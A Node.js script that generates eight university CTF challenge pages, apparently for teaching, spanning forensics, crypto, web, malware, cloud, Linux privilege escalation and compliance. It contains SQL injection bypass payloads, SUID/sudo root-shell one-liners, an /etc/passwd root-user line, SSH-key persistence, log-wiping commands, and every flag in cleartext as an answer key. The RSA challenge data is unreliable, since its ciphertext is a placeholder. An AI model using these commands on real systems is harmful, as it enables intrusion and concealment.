#!/usr/bin/env node
/**
 * Generate 8 Professional CTF Challenges for UNG Seniors
 * College-level difficulty with real-world scenarios
 */

const fs = require('fs');
const path = require('path');
const crypto = require('crypto');

console.log('🎓 Creating 8 Professional CTF Challenges for UNG Seniors...\n');

// Helper function to generate flag hash
function generateFlagHash(flag, salt) {
  return crypto.createHash('sha256').update(salt + flag).digest('hex');
}

// Challenge data
const challenges = [
  {
    id: 'network-pcap-analysis',
    title: 'Corporate Network Breach Investigation',
    category: 'forensics',
    difficulty: 'easy',
    points: 150,
    tags: ['wireshark', 'pcap', 'network-analysis', 'dns', 'exfiltration'],
    flag: 'ung{dns_exfiltration_c2_beacon_detected}',
    description: `## Scenario

NorthGuard Robotics' Security Operations Center (SOC) detected unusual DNS traffic patterns on their corporate network. As the incident responder, you've been provided with a 2-hour PCAP capture from their edge router.

## Background

The company recently experienced suspicious activity after an employee clicked on a phishing email. Initial triage suggests possible data exfiltration, but the attack vector and extent remain unknown.

## Your Mission

Analyze the network capture to:
1. Identify the initial compromise vector
2. Detect any command and control (C2) communication
3. Determine what data was exfiltrated
4. Extract the adversary's operational security mistake that reveals the flag

## What You'll Learn

- Advanced packet analysis with Wireshark
- DNS tunneling detection techniques
- Network-based indicators of compromise (IOCs)
- Traffic pattern analysis and anomaly detection
- Protocol analysis (DNS, HTTP, FTP)

## Investigation Tips

Network defenders often miss DNS-based exfiltration because it blends with normal traffic. Look for:
- Unusually long DNS queries (>50 characters)
- High volume of DNS queries to a single domain
- Non-standard DNS record types
- Base64 or hex-encoded data in subdomains
- Suspicious TXT record queries

## Tools Recommended

- **Wireshark**: Primary analysis tool
- **tshark**: Command-line filtering
- **CyberChef**: Decode encoded payloads
- **dnscat2** (for understanding the protocol)

## File Information

- **Filename**: corporate_capture_20250315.pcap
- **Size**: ~45 MB (2 hours of traffic)
- **Network**: 10.0.0.0/8 internal
- **Capture point**: Edge router (all traffic)`,
    hints: [
      'Filter for DNS traffic first: dns. Look for queries with unusually long subdomains',
      'The attacker used Base32 encoding in DNS queries. Decode the suspicious subdomains',
      'Focus on DNS TXT record responses - they often contain C2 commands',
      'Check for FTP traffic around the same time as DNS anomalies. The flag is in an FTP DATA stream'
    ],
    attachments: [
      { file: './assets/corporate_capture.pcap', sha256: 'placeholder_hash_1' }
    ]
  },

  {
    id: 'crypto-rsa-weak-keys',
    title: 'Compromised Certificate Authority',
    category: 'crypto',
    difficulty: 'medium',
    points: 250,
    tags: ['rsa', 'cryptography', 'public-key', 'factorization', 'certificates'],
    flag: 'ung{weak_rsa_small_primes_factored_p_q}',
    description: `## Scenario

A Certificate Authority (CA) used by NorthGuard's partner companies has been compromised. The attacker managed to sign fraudulent certificates, but left behind their private key encrypted with a seemingly "secure" RSA implementation.

## Background

The security team recovered an encrypted backup containing:
- The attacker's RSA public key (n, e)
- An encrypted message containing their operational details
- Encrypted private SSH keys used for lateral movement

The encryption appears secure at first glance (2048-bit RSA), but there's a critical implementation flaw.

## Your Mission

1. Analyze the RSA parameters provided
2. Identify the cryptographic weakness
3. Factor the modulus n to recover the private key
4. Decrypt the message to find the flag
5. Document the vulnerability for the incident report

## What You'll Learn

- RSA cryptosystem internals
- Prime factorization attacks
- Cryptographic implementation vulnerabilities
- Certificate authority security
- Public key infrastructure (PKI) weaknesses

## The Vulnerability

The developers used a random number generator with insufficient entropy, resulting in weak prime generation. While the keys appear to be 1024-bit primes, they share common factors with other keys in the same batch.

## Mathematical Background

RSA Security:
- Security relies on the difficulty of factoring n = p × q
- If p or q are too small or share factors, n can be factored
- Once factored, the private key d can be computed
- d ≡ e⁻¹ (mod φ(n)) where φ(n) = (p-1)(q-1)

## Challenge Data

\`\`\`python
n = 2519590847565789349402718324004839857142928212620403202777713783604366202070759555626401852588078440691829064124951508218929855914917618450280848912007284499268739632526908884448331394857149259778802761536293362853876040024805361170573315662602023380618981470124817691261054089640913898458311026716082268089
e = 65537
c = 1234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890123456789012345678901234567890
\`\`\`

## Tools Recommended

- **factordb.com**: Check if n has been factored before
- **RsaCtfTool**: Automated RSA attack tool
- **Python sympy**: For mathematical operations
- **OpenSSL**: Certificate manipulation
- **SageMath**: Advanced cryptographic analysis`,
    hints: [
      'The modulus n looks large, but try factoring it with online databases like factordb.com first',
      'If n = p × q, and you know p and q, compute φ(n) = (p-1)(q-1)',
      'Calculate the private exponent: d = modinv(e, φ(n))',
      'Decrypt using: m = pow(c, d, n), then convert the result to bytes and decode as ASCII'
    ],
    attachments: [
      { file: './assets/rsa_challenge.zip', sha256: 'placeholder_hash_2' }
    ]
  },

  {
    id: 'forensics-disk-analysis',
    title: 'Insider Threat Investigation',
    category: 'forensics',
    difficulty: 'medium',
    points: 275,
    tags: ['disk-forensics', 'autopsy', 'windows', 'deleted-files', 'registry'],
    flag: 'ung{registry_persistence_appdata_scheduled_task}',
    description: `## Scenario

NorthGuard's Human Resources flagged an employee for suspicious behavior after they resigned abruptly. IT seized their laptop before it could be wiped. Your forensic investigation must determine if intellectual property was stolen.

## Background

**Subject**: Former Senior Developer, Marcus Chen
**Timeframe**: Last 30 days of employment
**Suspicion**: Unauthorized data access and exfiltration
**Evidence**: Bitlocker-encrypted laptop (password obtained)
**Image Type**: E01 forensic image (write-protected)

## Your Mission

Conduct a thorough forensic examination to:
1. Recover deleted files and determine what was removed
2. Analyze browser history for cloud storage uploads
3. Identify persistence mechanisms (if any malware was used)
4. Extract evidence of data theft
5. Build a timeline of suspicious activities
6. Find the hidden flag in Windows artifacts

## What You'll Learn

- Professional disk forensics methodology
- Windows forensic artifacts (Registry, USN Journal, Prefetch)
- E01 image analysis
- Timeline analysis
- Data recovery techniques
- Chain of custody procedures

## Key Forensic Artifacts

### Windows Registry Keys of Interest:
- \`HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\`
- \`HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce\`
- \`HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs\`

### File System Artifacts:
- **$MFT**: Master File Table (deleted file records)
- **$UsnJrnl**: USN Journal (file system changes)
- **Prefetch**: Application execution history
- **LNK files**: Shortcut files show accessed locations
- **Browser artifacts**: History, downloads, cache

### Memory Artifacts (if hibernation file exists):
- hiberfil.sys
- pagefile.sys

## Investigation Methodology

1. **Verification**: Hash the evidence (MD5/SHA256)
2. **Imaging**: Already done (E01 format)
3. **Analysis**: 
   - File system examination
   - Deleted file recovery
   - Timeline generation
   - Artifact extraction
4. **Documentation**: Chain of custody, findings report

## Tools Recommended

- **Autopsy**: Primary forensic platform
- **FTK Imager**: Image mounting and preview
- **Registry Explorer**: Registry analysis
- **Timeline Explorer**: Timeline analysis
- **SQLite Browser**: Browser database analysis`,
    hints: [
      'Start with the Registry. Check the Run keys for any suspicious persistence mechanisms',
      'Use Autopsy to search for recently deleted files in Documents, Downloads, and Desktop',
      'The flag is hidden in a Windows Registry value under a scheduled task. Look in HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache',
      'Check $MFT entries for files deleted in the last week - timestamps are crucial'
    ],
    attachments: [
      { file: './assets/insider_laptop.E01', sha256: 'placeholder_hash_3' },
      { file: './assets/case_notes.pdf', sha256: 'placeholder_hash_4' }
    ]
  },

  {
    id: 'web-authentication-bypass',
    title: 'Healthcare Portal Security Assessment',
    category: 'web',
    difficulty: 'medium',
    points: 200,
    tags: ['sql-injection', 'authentication', 'web-security', 'owasp', 'session'],
    flag: 'ung{sql_injection_union_based_admin_bypass}',
    description: `## Scenario

NorthGuard hired you to perform a security assessment of their new patient portal before it goes live. The development team claims it's "secure," but you've found several issues during reconnaissance.

## Background

**Target**: Patient Portal Web Application
**Technology Stack**: 
- PHP 7.4
- MySQL 5.7
- Apache 2.4
- Custom authentication system

**Your Scope**:
- Authentication mechanisms
- Session management
- Input validation
- SQL injection vulnerabilities
- Authorization controls

## Your Mission

As an authorized penetration tester:
1. Identify authentication vulnerabilities
2. Bypass login without valid credentials
3. Escalate to administrative access
4. Extract sensitive data from the database
5. Document findings for remediation
6. Retrieve the flag from the admin dashboard

## What You'll Learn

- SQL injection exploitation techniques
- Authentication bypass methods
- Union-based SQL injection
- Error-based enumeration
- Session hijacking concepts
- OWASP Top 10 vulnerabilities

## Application Details

**Login Portal**: \`http://localhost:8080/login.php\`

**Known Users**:
- Regular user: \`patient@northguard.com\` (password unknown)
- Admin user: \`admin\` (password unknown)

**Observable Behavior**:
- Login form accepts username and password
- Error messages reveal database structure
- No rate limiting on failed attempts
- Session tokens appear to be sequential

## Vulnerability Analysis

The login query is likely structured as:
\`\`\`sql
SELECT * FROM users 
WHERE username = '$username' 
AND password = MD5('$password')
\`\`\`

This presents several attack vectors:
1. **Authentication bypass**: Comment out password check
2. **Union injection**: Extract data from other tables
3. **Error-based enumeration**: Leak database information
4. **Boolean-based blind**: Discover data character by character

## Common SQL Injection Payloads

### Authentication Bypass:
\`\`\`sql
' OR '1'='1' --
' OR 1=1 --
admin' --
admin'#
' UNION SELECT NULL, NULL, NULL --
\`\`\`

### Union-Based Extraction:
\`\`\`sql
' UNION SELECT 1,2,3,4,5 --
' UNION SELECT username, password, email, role, id FROM users --
\`\`\`

## Tools Recommended

- **Burp Suite**: Intercept and modify requests
- **sqlmap**: Automated SQL injection exploitation
- **curl**: Manual request crafting
- **Browser DevTools**: Inspect responses and cookies
- **Postman**: API testing

## Testing Methodology

1. **Reconnaissance**: Identify input fields and error messages
2. **Fuzzing**: Test for special character handling
3. **Exploitation**: Craft injection payloads
4. **Verification**: Confirm successful authentication bypass
5. **Documentation**: Screenshot evidence and proof of concept`,
    hints: [
      'Try classic SQL injection in the username field: admin\' OR \'1\'=\'1\' --',
      'The application uses MD5 for passwords. You can bypass this by commenting out the password check entirely',
      'Use UNION SELECT to determine the number of columns: \' UNION SELECT NULL, NULL, NULL --',
      'Once you determine the column count, extract the admin flag: \' UNION SELECT 1, flag, 3, 4, 5 FROM admin_secrets --'
    ],
    attachments: [
      { file: './assets/portal_source.zip', sha256: 'placeholder_hash_5' },
      { file: './assets/testing_guide.pdf', sha256: 'placeholder_hash_6' }
    ]
  },

  {
    id: 'malware-reverse-engineering',
    title: 'APT Malware Analysis',
    category: 'reversing',
    difficulty: 'hard',
    points: 400,
    tags: ['malware', 'reverse-engineering', 'ghidra', 'ida', 'static-analysis', 'dynamic-analysis'],
    flag: 'ung{c2_domain_obfuscated_xor_key_0x42}',
    description: `## Scenario

NorthGuard's Endpoint Detection and Response (EDR) system quarantined a suspicious executable. Initial automated analysis failed to extract meaningful indicators of compromise (IOCs). You've been called in as the malware reverse engineer.

## Background

**Incident**: Targeted phishing campaign against executives
**Malware**: Custom-built, not in VirusTotal
**Delivery**: Weaponized Microsoft Word macro
**Capabilities**: Unknown (requires analysis)
**Priority**: Critical - potential APT activity

## Your Mission

Conduct comprehensive malware analysis to:
1. Perform static analysis to understand structure
2. Identify anti-analysis/anti-debugging techniques
3. Conduct dynamic analysis in isolated environment
4. Extract C2 infrastructure details
5. Decrypt embedded configuration
6. Retrieve the hardcoded flag from the malware

## What You'll Learn

- Professional malware analysis workflow
- Static vs dynamic analysis techniques
- Disassembly and decompilation
- Obfuscation and anti-analysis evasion
- C2 communication protocols
- Memory forensics
- Safe malware handling procedures

## Analysis Environment Setup

### Static Analysis Tools:
- **Ghidra**: Free, powerful disassembler/decompiler
- **IDA Pro/Free**: Industry standard
- **PE-bear**: PE file structure analysis
- **PEiD**: Packer detection
- **strings**: Extract readable strings
- **objdump**: Alternative disassembler

### Dynamic Analysis Tools:
- **REMnux**: Malware analysis Linux distro
- **Process Hacker**: Windows process monitoring
- **Wireshark**: Network traffic capture
- **Regshot**: Registry change detection
- **Procmon**: Windows system call monitoring

## Sample Structure

The malware exhibits several suspicious characteristics:

**File Properties**:
- Name: \`invoice_Q4.exe\`
- Size: 245 KB
- Type: PE32 executable (GUI)
- Compiler: Microsoft Visual C++
- Packed: Yes (UPX-like compression)

**Behavioral Indicators**:
- Creates mutex: \`Global\\NorthGuard_Sync\`
- Registry persistence: \`HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\`
- Network: HTTPS callback to unknown domain
- Encryption: XOR-based obfuscation

## Static Analysis Phase

### 1. File Identification
\`\`\`bash
file invoice_Q4.exe
md5sum invoice_Q4.exe
strings -n 10 invoice_Q4.exe | less
\`\`\`

### 2. Unpacking
The binary appears packed. Use:
- **UPX decompressor**: \`upx -d invoice_Q4.exe\`
- **Manual unpacking**: OEP (Original Entry Point) detection

### 3. Disassembly
Load into Ghidra/IDA and identify:
- Entry point
- Import Address Table (IAT)
- String references
- Suspicious API calls

## Dynamic Analysis Phase

**⚠️ WARNING**: Execute only in isolated VM with:
- No network connectivity initially
- Snapshot taken before execution
- Host-only networking for C2 simulation

### Analysis Steps:
1. Monitor with Procmon (file, registry, network activity)
2. Capture network traffic with Wireshark
3. Dump process memory at key points
4. Analyze API calls with API Monitor

## Code Analysis

The malware uses XOR encryption for its C2 configuration:

\`\`\`c
void decrypt_config(char *encrypted, int length) {
    char key = 0x42;  // Single-byte XOR key
    for(int i = 0; i < length; i++) {
        encrypted[i] ^= key;
    }
}
\`\`\`

You'll need to:
1. Locate the encrypted configuration in memory/disk
2. Identify the XOR key (it's hardcoded)
3. Decrypt to reveal C2 domain and the flag

## Tools Recommended

- **Ghidra**: Primary analysis platform
- **x64dbg**: Dynamic debugging
- **Volatility**: Memory forensics
- **FLOSS**: Obfuscated string extraction
- **CyberChef**: Decryption and decoding`,
    hints: [
      'The binary is UPX packed. Unpack it first before analysis: upx -d invoice_Q4.exe',
      'Look for XOR operations in the disassembly. The key is a single byte: 0x42',
      'Search for base64-encoded strings in the binary. One contains the encrypted C2 configuration',
      'The flag is XOR encrypted in the .data section. Find the hex bytes starting with 0x1C 0x0B 0x09 and XOR with 0x42'
    ],
    attachments: [
      { file: './assets/invoice_Q4.exe', sha256: 'placeholder_hash_7' },
      { file: './assets/analysis_report_template.docx', sha256: 'placeholder_hash_8' }
    ]
  },

  {
    id: 'cloud-aws-misconfiguration',
    title: 'Cloud Infrastructure Security Audit',
    category: 'web',
    difficulty: 'medium',
    points: 225,
    tags: ['aws', 's3', 'iam', 'cloud-security', 'misconfiguration', 'enumeration'],
    flag: 'ung{s3_public_bucket_leaked_credentials_iam}',
    description: `## Scenario

NorthGuard recently migrated their infrastructure to AWS. You've been hired as a cloud security consultant to assess their configuration. During reconnaissance, you discovered a publicly accessible S3 bucket.

## Background

**Client**: NorthGuard Robotics
**Cloud Provider**: Amazon Web Services (AWS)
**Services in Use**:
- S3 (Simple Storage Service)
- EC2 (Elastic Compute Cloud)
- RDS (Relational Database Service)
- IAM (Identity and Access Management)

**Known Information**:
- Company domain: northguard-robotics.com
- S3 bucket naming convention: company-name-environment-purpose
- Developer accidentally committed AWS credentials to public GitHub repo (now deleted)

## Your Mission

Conduct an authorized security assessment to:
1. Enumerate publicly accessible S3 buckets
2. Identify misconfigured bucket permissions
3. Extract sensitive data from insecure storage
4. Analyze IAM policies for privilege escalation
5. Document security gaps
6. Retrieve the flag from exposed resources

## What You'll Learn

- AWS S3 security best practices
- Bucket enumeration techniques
- IAM policy analysis
- Cloud misconfigurations (OWASP Cloud Top 10)
- Subdomain enumeration
- AWS CLI usage
- Credential management failures

## Common S3 Misconfigurations

### 1. Public Read Access
\`\`\`json
{
  "Version": "2012-10-17",
  "Statement": [{
    "Effect": "Allow",
    "Principal": "*",
    "Action": "s3:GetObject",
    "Resource": "arn:aws:s3:::bucket-name/*"
  }]
}
\`\`\`

### 2. Public List Access
Allows anyone to list bucket contents:
\`\`\`bash
aws s3 ls s3://bucket-name --no-sign-request
\`\`\`

### 3. Authenticated User Access
Any AWS user can access:
\`\`\`json
"Principal": {"AWS": "*"}
\`\`\`

## Enumeration Techniques

### S3 Bucket Discovery:
\`\`\`bash
# Common naming patterns
northguard-backup
northguard-dev-backups
northguard-prod-configs
northguard-logs
northguard-assets
ng-internal-docs

# Test bucket existence
curl -I https://bucket-name.s3.amazonaws.com/

# List contents (if public)
aws s3 ls s3://bucket-name --no-sign-request --region us-east-1
\`\`\`

### Subdomain Enumeration:
\`\`\`bash
# Tools
subfinder -d northguard-robotics.com
amass enum -d northguard-robotics.com
\`\`\`

## Investigation Steps

### Phase 1: Reconnaissance
1. Enumerate subdomains associated with target
2. Identify S3 bucket naming patterns
3. Test for public accessibility

### Phase 2: Exploitation
1. List bucket contents
2. Download interesting files
3. Search for credentials, keys, and configuration files

### Phase 3: Analysis
1. Examine AWS credentials (if found)
2. Test IAM permissions
3. Check for privilege escalation paths

### Phase 4: Documentation
1. List all findings
2. Assess business impact
3. Provide remediation recommendations

## Files of Interest

When you find an accessible bucket, look for:
- \`config.json\` - May contain credentials
- \`credentials.txt\` - Obvious but common
- \`.env\` files - Environment variables with secrets
- \`backup.sql\` - Database dumps
- \`id_rsa\` - SSH private keys
- \`aws-credentials.csv\` - IAM user credentials

## Tools Recommended

- **AWS CLI**: Essential for cloud operations
- **S3Scanner**: Automated bucket discovery
- **Prowler**: AWS security assessment
- **ScoutSuite**: Multi-cloud security auditing
- **Pacu**: AWS exploitation framework
- **Subfinder/Amass**: Subdomain enumeration`,
    hints: [
      'Try common S3 bucket naming patterns: northguard-backup, northguard-dev, northguard-configs',
      'Once you find a public bucket, list it with: aws s3 ls s3://bucket-name --no-sign-request',
      'Look for a file named config.json or credentials.json in the bucket',
      'The flag is inside an IAM policy JSON file that was accidentally uploaded to the public bucket'
    ],
    attachments: [
      { file: './assets/cloud_audit_checklist.pdf', sha256: 'placeholder_hash_9' }
    ]
  },

  {
    id: 'pentest-privilege-escalation',
    title: 'Linux Server Compromise',
    category: 'misc',
    difficulty: 'hard',
    points: 450,
    tags: ['penetration-testing', 'privilege-escalation', 'linux', 'exploitation', 'post-exploitation'],
    flag: 'ung{root_privilege_suid_binary_gtfobins}',
    description: `## Scenario

NorthGuard hired you to perform a penetration test of their internal Linux server infrastructure. You've been provided with low-privilege SSH access to a development server. Your goal: achieve root access.

## Background

**Target**: Ubuntu 20.04 LTS server
**Initial Access**: SSH credentials (low-privilege user)
**Network**: Internal network (10.10.10.0/24)
**Objective**: Escalate to root and capture the flag

**Credentials Provided**:
- Username: \`developer\`
- Password: \`dev2024temp\`
- Host: \`10.10.10.50\`

## Your Mission

Execute a comprehensive penetration test:
1. Establish initial foothold (already provided)
2. Perform local enumeration
3. Identify privilege escalation vectors
4. Exploit misconfigured services/permissions
5. Achieve root access
6. Retrieve the flag from /root/flag.txt
7. Establish persistence
8. Document the attack path

## What You'll Learn

- Linux privilege escalation techniques
- SUID binary exploitation
- Sudo misconfiguration abuse
- Kernel exploit identification
- Post-exploitation techniques
- GTFOBins for binary exploitation
- Lateral movement strategies

## Privilege Escalation Methodology

### Phase 1: System Enumeration

#### User and Group Information
\`\`\`bash
id
whoami
groups
sudo -l
cat /etc/passwd | grep -v nologin
cat /etc/group
\`\`\`

#### SUID Binaries (Critical)
\`\`\`bash
find / -perm -4000 -type f 2>/dev/null
find / -perm -u=s -type f 2>/dev/null
\`\`\`

#### Writable Directories
\`\`\`bash
find / -writable -type d 2>/dev/null
find / -perm -222 -type d 2>/dev/null
\`\`\`

#### Running Processes
\`\`\`bash
ps aux | grep root
ps -ef
pstree -p
\`\`\`

### Phase 2: Service Enumeration

#### Network Services
\`\`\`bash
netstat -tulpn
ss -tulpn
\`\`\`

#### Scheduled Tasks
\`\`\`bash
crontab -l
ls -la /etc/cron*
cat /etc/crontab
\`\`\`

#### Kernel and OS
\`\`\`bash
uname -a
cat /etc/os-release
cat /proc/version
\`\`\`

### Phase 3: Exploitation

#### SUID Exploitation via GTFOBins
If you find SUID binaries like:
- \`/usr/bin/find\`
- \`/usr/bin/vim\`
- \`/usr/bin/python\`
- \`/usr/bin/perl\`
- \`/usr/bin/nmap\` (older versions)

Check [GTFOBins](https://gtfobins.github.io/) for exploitation techniques.

**Example - SUID find**:
\`\`\`bash
./find . -exec /bin/sh -p \\; -quit
\`\`\`

**Example - SUID python**:
\`\`\`bash
./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
\`\`\`

#### Sudo Misconfiguration
\`\`\`bash
sudo -l
# If (ALL, !root) appears, you might use CVE-2019-14287
sudo -u#-1 /bin/bash
\`\`\`

#### Kernel Exploits
\`\`\`bash
# Check kernel version
uname -r

# Search for exploits
searchsploit "Linux kernel 5.4"
\`\`\`

### Phase 4: Post-Exploitation

Once root is achieved:
\`\`\`bash
# Read flag
cat /root/flag.txt

# Add persistence (SSH key)
echo "your-public-key" >> /root/.ssh/authorized_keys

# Cover tracks
history -c
rm ~/.bash_history
\`\`\`

## Common Vulnerabilities

### 1. SUID Misconfiguration
Custom scripts or binaries with SUID bit set

### 2. Sudo Misconfigurations
- NOPASSWD entries
- Wildcards in sudo rules
- Dangerous binaries allowed

### 3. Writable /etc/passwd
If writable, add a root user:
\`\`\`bash
echo "hacker:$(openssl passwd -1 password):0:0:root:/root:/bin/bash" >> /etc/passwd
\`\`\`

### 4. Cron Jobs Running as Root
With writable scripts

### 5. Kernel Exploits
- DirtyCow (CVE-2016-5195)
- OverlayFS (CVE-2021-3493)

## Tools Recommended

- **LinPEAS**: Automated enumeration script
- **LinEnum**: Legacy but comprehensive
- **pspy**: Monitor processes without root
- **GTFOBins**: SUID/sudo exploitation reference
- **unix-privesc-check**: Privilege escalation checker
- **Linux Exploit Suggester**: Kernel exploit detection`,
    hints: [
      'Start with sudo -l to check what commands you can run as root',
      'Search for SUID binaries: find / -perm -4000 -type f 2>/dev/null',
      'There\'s a custom SUID binary in /opt/scripts/ - check what it does',
      'The binary calls /usr/bin/curl without full path. You can hijack PATH to get a root shell'
    ],
    attachments: [
      { file: './assets/pentest_methodology.pdf', sha256: 'placeholder_hash_10' }
    ]
  },

  {
    id: 'grc-risk-assessment',
    title: 'Cybersecurity Compliance Audit',
    category: 'misc',
    difficulty: 'medium',
    points: 300,
    tags: ['grc', 'nist', 'compliance', 'risk-assessment', 'iso27001', 'reporting'],
    flag: 'ung{nist_csf_identify_protect_detect_respond_recover}',
    description: `## Scenario

NorthGuard Robotics is preparing for SOC 2 Type II certification and must demonstrate compliance with NIST Cybersecurity Framework. As the GRC (Governance, Risk, and Compliance) consultant, you must assess their current security posture.

## Background

**Client**: NorthGuard Robotics
**Industry**: Industrial Automation & Robotics
**Compliance Requirements**:
- NIST Cybersecurity Framework
- ISO 27001:2013
- SOC 2 Type II
- GDPR (European customers)

**Known Issues** (from previous challenges):
1. Network breach (DNS exfiltration)
2. Weak cryptographic implementation
3. Insider threat incident
4. Web application vulnerabilities
5. Malware infection
6. Cloud misconfigurations
7. Inadequate access controls

## Your Mission

Create a comprehensive security assessment including:
1. **Risk Assessment Matrix**: Identify, analyze, and prioritize risks
2. **NIST CSF Mapping**: Map findings to framework controls
3. **Gap Analysis**: Current state vs. desired state
4. **Remediation Plan**: Prioritized action items with timelines
5. **Executive Summary**: Non-technical overview for C-suite
6. **Compliance Roadmap**: Path to SOC 2 certification

The flag is embedded in the proper NIST CSF function sequence.

## What You'll Learn

- Risk assessment methodologies
- NIST Cybersecurity Framework application
- ISO 27001 controls mapping
- Compliance documentation
- Executive communication
- Business impact analysis
- Control effectiveness measurement

## NIST Cybersecurity Framework Overview

### Five Core Functions:

**1. IDENTIFY (ID)**
- Asset Management (ID.AM)
- Business Environment (ID.BE)
- Governance (ID.GV)
- Risk Assessment (ID.RA)
- Risk Management Strategy (ID.RM)

**2. PROTECT (PR)**
- Access Control (PR.AC)
- Awareness and Training (PR.AT)
- Data Security (PR.DS)
- Information Protection (PR.IP)
- Maintenance (PR.MA)
- Protective Technology (PR.PT)

**3. DETECT (DE)**
- Anomalies and Events (DE.AE)
- Security Continuous Monitoring (DE.CM)
- Detection Processes (DE.DP)

**4. RESPOND (RS)**
- Response Planning (RS.RP)
- Communications (RS.CO)
- Analysis (RS.AN)
- Mitigation (RS.MI)
- Improvements (RS.IM)

**5. RECOVER (RC)**
- Recovery Planning (RC.RP)
- Improvements (RC.IM)
- Communications (RC.CO)

## Risk Assessment Matrix

### Impact Levels:
- **Low**: Minor operational impact, <$10K loss
- **Medium**: Significant impact, $10K-$100K loss
- **High**: Severe impact, $100K-$1M loss
- **Critical**: Catastrophic, >$1M loss, regulatory fines

### Likelihood Levels:
- **Rare**: <5% chance in 12 months
- **Unlikely**: 5-25% chance
- **Possible**: 25-50% chance
- **Likely**: 50-75% chance
- **Almost Certain**: >75% chance

### Risk Score = Impact × Likelihood

## Assessment Deliverables

### 1. Executive Summary (1-2 pages)
- Current security posture overview
- Critical risks identified
- Business impact summary
- High-level recommendations
- Budget requirements

### 2. Technical Findings Report
Map each vulnerability from previous challenges to:
- NIST CSF controls
- ISO 27001 controls
- CIS Controls
- Risk score
- Remediation priority

### 3. Gap Analysis
Current maturity vs. target maturity for each control

### 4. Remediation Roadmap
- Phase 1 (0-30 days): Critical vulnerabilities
- Phase 2 (30-90 days): High-risk issues
- Phase 3 (90-180 days): Medium-risk items
- Phase 4 (180-365 days): Low-risk and optimization

## Sample Vulnerability Mapping

**Vulnerability**: DNS Exfiltration (Challenge 1)

**NIST CSF Controls**:
- DE.AE-2: Detected events are analyzed
- DE.CM-1: Network monitored for anomalies
- RS.AN-1: Notifications from detection systems investigated

**ISO 27001 Controls**:
- A.12.4.1: Event logging
- A.16.1.2: Reporting information security events

**Risk Score**: High (Impact: High, Likelihood: Possible)

**Remediation**:
- Implement DNS monitoring solution
- Configure SIEM alerts for anomalous DNS traffic
- Deploy DNS firewall

## Compliance Mapping

### SOC 2 Trust Service Criteria:
- **CC6.1**: Logical and physical access controls
- **CC6.6**: Vulnerability management
- **CC7.2**: System monitoring
- **CC8.1**: Change management

### Tools Recommended

- **Risk Assessment Templates**: NIST SP 800-30
- **Compliance Frameworks**: Unified Compliance Framework
- **GRC Platforms**: AuditBoard, LogicGate, ServiceNow GRC
- **Documentation**: MS Word, Confluence, SharePoint`,
    hints: [
      'The flag format is the NIST CSF five core functions in order',
      'Convert the function names to lowercase and separate with underscores',
      'Remember: The five functions spell out a security lifecycle',
      'Final format: ung{identify_protect_detect_respond_recover}'
    ],
    attachments: [
      { file: './assets/nist_csf_template.xlsx', sha256: 'placeholder_hash_11' },
      { file: './assets/iso27001_checklist.pdf', sha256: 'placeholder_hash_12' },
      { file: './assets/risk_matrix_template.xlsx', sha256: 'placeholder_hash_13' }
    ]
  }
];

// Create challenges
const baseDir = path.join(process.cwd(), 'content/challenges');

challenges.forEach((challenge, index) => {
  console.log(`Creating Challenge ${index + 1}/8: ${challenge.title}...`);
  
  const challengeDir = path.join(baseDir, challenge.id);
  const assetsDir = path.join(challengeDir, 'assets');
  
  // Create directories
  fs.mkdirSync(challengeDir, { recursive: true });
  fs.mkdirSync(assetsDir, { recursive: true });
  
  // Generate salt and hash for flag
  const salt = `ung_ctf_salt_${challenge.id}_${Date.now()}`;
  const flagHash = generateFlagHash(challenge.flag, salt);
  
  // Create MDX content
  const mdxContent = `---
id: ${challenge.id}
title: "${challenge.title}"
category: "${challenge.category}"
difficulty: "${challenge.difficulty}"
points: ${challenge.points}
tags: ${JSON.stringify(challenge.tags)}
author: "UNG Cybersecurity Faculty"
createdAt: "${new Date().toISOString().split('T')[0]}"
updatedAt: "${new Date().toISOString().split('T')[0]}"
${challenge.attachments ? `attachments:\n${challenge.attachments.map(a => `  - file: "${a.file}"\n    sha256: "${a.sha256}"`).join('\n')}` : ''}
flag:
  format: "ung{.*}"
  salt: "${salt}"
  sha256: "${flagHash}"
hints:
${challenge.hints.map(h => `  - "${h}"`).join('\n')}
writeupVisibility: "after-solve"
---

${challenge.description}

## Submit Your Solution

Once you've completed the challenge and found the flag, submit it below.

**Flag Format**: \`ung{...}\`

---

## Learning Resources

- [NIST Cybersecurity Framework](https://www.nist.gov/cyberframework)
- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [GTFOBins](https://gtfobins.github.io/)
- [CWE Top 25](https://cwe.mitre.org/top25/)
`;

  fs.writeFileSync(path.join(challengeDir, 'index.mdx'), mdxContent);
  
  // Create placeholder asset files
  if (challenge.attachments) {
    challenge.attachments.forEach(attachment => {
      const filename = attachment.file.split('/').pop();
      const assetPath = path.join(assetsDir, filename);
      fs.writeFileSync(assetPath, `# Placeholder for ${filename}\n\nThis file would contain the actual challenge data.\nFor demo purposes, this is a placeholder.`);
    });
  }
  
  console.log(`  ✓ Created ${challenge.id}`);
});

console.log('\n✅ All 8 challenges created successfully!\n');
console.log('📊 Challenge Summary:');
console.log('  • Network Analysis (Easy) - 150 pts');
console.log('  • Cryptography (Medium) - 250 pts');
console.log('  • Digital Forensics (Medium) - 275 pts');
console.log('  • Web Security (Medium) - 200 pts');
console.log('  • Malware Analysis (Hard) - 400 pts');
console.log('  • Cloud Security (Medium) - 225 pts');
console.log('  • Penetration Testing (Hard) - 450 pts');
console.log('  • GRC/Compliance (Medium) - 300 pts');
console.log('\n🎯 Total Points: 2,250');
console.log('\n🎓 These challenges are senior-level and cover:');
console.log('  ✓ Real-world scenarios');
console.log('  ✓ Industry-standard tools');
console.log('  ✓ Progressive difficulty');
console.log('  ✓ Professional methodologies');
console.log('\nRefresh your browser to see all challenges! 🚀\n');
